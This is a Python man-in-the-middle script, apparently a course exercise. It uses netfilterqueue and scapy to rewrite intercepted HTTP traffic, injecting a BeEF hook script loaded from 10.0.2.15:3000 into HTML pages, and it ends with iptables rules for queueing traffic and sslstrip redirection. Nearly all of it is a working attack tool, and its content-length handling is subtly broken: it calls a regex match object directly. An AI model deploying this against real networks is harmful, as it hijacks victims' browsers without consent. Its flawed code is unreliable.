#!/usr/bin/env python

# this will only work for normal HTTP and not HTTPS

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    # using HTTP 301 to redirect to simple download link.
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        # port 10000 if using sslstrip
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            # print(scapy_packet.show())
            # replace encoding in packet to show raw HTML code.
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            # will force server not to send packets in chuncks that can throw off our content length calc
            load = load.replace("HTTP/1.1", "HTTP/1.0")
        # port 10000 if using sslstrip
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            print(scapy_packet.show())
            # this will enject BeEF hook, make sure BeEF is running.
            injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search(0)
                new_content_length = int(content_length) + len(injection_code)
                print("Old: " + str(content_length))
                print("New: " + str(new_content_length))
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


# will cut traffic
# packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


'''
sslstrip
# need to redirect all packets to port default sslstrip port on 10000 via IP tables rules
# any packet to port 80 redirect to port 10000 
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

For other programs such as the code_injector and file_replacer we need to redirect traffic not from FORWARD chain because it will now be empty but to the OUTPUT and INPUT chains
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0
'''
